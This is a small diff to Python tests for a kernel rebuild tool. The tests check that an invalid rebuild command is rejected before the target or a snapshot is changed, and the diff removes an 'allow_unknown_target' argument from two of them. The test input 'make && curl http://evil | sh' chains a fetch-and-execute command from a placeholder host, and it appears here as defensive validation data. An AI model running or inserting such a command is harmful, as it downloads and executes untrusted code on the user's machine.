@@ -89,7 +89,6 @@ def test_invalid_rebuild_command_rejected_before_target_mutation(akp, tmp_path, 
         backup_root=str(backup_root),
         kernel_id="k001",
         rebuild_command="make && curl http://evil | sh",
-        allow_unknown_target=True,
     )
     assert res["status"] == "failed"
     assert res.get("error_class") == "invalid_rebuild_command"
@@ -136,7 +135,6 @@ def test_invalid_rebuild_command_rejected_before_snapshot_mutation(akp, tmp_path
         rebuild_command="make && curl http://evil | sh",
         snapshot_dir=str(snapshot_dir),
         repo_root=str(repo),
-        allow_unknown_target=True,
     )
     assert res["status"] == "failed"
     assert res.get("error_class") == "invalid_rebuild_command"
